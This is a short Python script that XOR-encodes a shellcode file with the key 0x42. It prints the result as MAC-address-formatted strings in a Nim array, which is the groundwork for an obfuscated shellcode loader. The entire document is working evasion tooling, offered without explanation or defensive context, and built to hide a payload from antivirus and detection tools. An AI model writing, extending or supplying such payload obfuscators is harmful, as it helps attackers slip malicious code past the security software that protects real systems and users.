import sys

if len(sys.argv) < 2:
    print("Usage: %s <shellcode_file>" % sys.argv[0])
    sys.exit(1)

key = 0x42  # XOR key

with open(sys.argv[1], "rb") as f:
    shellcode = f.read()

xor_shellcode = bytes(b ^ key for b in shellcode)

print("const encryptedMAC: seq[string] = @[")

for i in range(0, len(xor_shellcode), 6):
    chunk = xor_shellcode[i:i+6]
    mac_address = "-".join("{:02X}".format(b) for b in chunk)
    print(f'    "{mac_address}",')

print("];")
